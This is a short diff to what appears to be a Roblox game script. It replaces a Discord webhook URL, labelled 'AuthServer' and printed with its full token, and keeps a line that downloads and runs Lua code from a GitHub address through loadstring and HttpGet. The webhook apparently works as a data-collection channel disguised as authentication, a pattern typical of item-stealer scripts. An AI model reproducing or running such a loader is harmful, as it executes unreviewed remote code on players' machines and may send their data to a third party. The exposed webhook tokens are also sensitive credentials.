@@ -1,3 +1,3 @@
 _G.Key = "yugnocaB_ZL"
-_G.AuthServer = "https://discord.com/api/webhooks/1050774073640231022/jE5wNAt_XCj6peJS_ZEIR_NpjSQIqigBFdS7xg8x6xMUzfybixwipAP4rG3vWPrxtZDX"
+_G.AuthServer = "https://discordapp.com/api/webhooks/1059013508202762301/dk4gDY3l6Eat2vuC5WpAmyta12pFPwYACwwFaaB0hq3MQRZTskX5G3WuKX_6EiO3gZBJ"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
